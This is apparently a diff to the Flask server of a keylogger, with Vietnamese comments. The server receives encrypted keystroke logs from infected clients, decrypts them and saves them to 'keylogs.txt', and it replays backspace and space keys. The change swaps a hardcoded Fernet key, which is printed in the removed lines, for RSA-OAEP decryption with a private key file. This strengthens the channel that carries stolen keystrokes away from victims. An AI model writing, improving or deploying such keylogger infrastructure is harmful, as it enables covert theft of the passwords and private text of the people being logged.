@@ -1,13 +1,17 @@
 from flask import Flask, request
 import base64
-from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import serialization, hashes
 import os
 
 app = Flask(__name__)
 
-# Khóa mã hóa Fernet (phải giống với client)
-encryption_key = b'X9w43Qkdw3439fkeudkjd9kXnFAk3FxpdCQq0J1kWxs='  # Sử dụng cùng khóa với client
-cipher_suite = Fernet(encryption_key)
+# Load RSA private key from a file (ensure this file is secure)
+with open("private_key.pem", "rb") as key_file:
+    private_key = serialization.load_pem_private_key(
+        key_file.read(),
+        password=None,
+    )
 
 # Đường dẫn tới file lưu trữ log
 log_file_path = 'keylogs.txt'
@@ -31,7 +35,14 @@ def receive_log():
         encrypted_log = base64.urlsafe_b64decode(encrypted_log_b64)
 
         # Giải mã dữ liệu
-        decrypted_log = cipher_suite.decrypt(encrypted_log).decode('utf-8')
+        decrypted_log = private_key.decrypt(
+            encrypted_log,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        ).decode('utf-8')
 
         # Xử lý ký tự "back" và "space"
         processed_log = ""
